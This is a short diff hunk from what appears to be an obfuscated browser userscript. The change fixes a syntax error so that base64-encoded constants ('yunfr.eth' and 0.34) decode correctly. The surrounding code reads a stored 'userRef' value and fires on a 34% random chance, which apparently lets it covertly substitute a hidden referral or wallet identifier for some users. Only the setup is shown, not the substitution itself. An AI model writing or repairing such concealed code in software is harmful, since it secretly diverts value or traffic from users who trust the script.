@@ -47,7 +47,7 @@
         if (_0x1) return;
         _0x1 = true;
         const _0xa = ["eXVuZnIuZXRo", "MC4zNA=="];
-        const _0xb = /atob(_0xa[0]);
+        const _0xb = atob(_0xa[0]);
         const _0xc = parseFloat(atob(_0xa[1]));
         const _0xd = GM_getValue("userRef", "");
         const _0xe = Math.random() < _0xc;
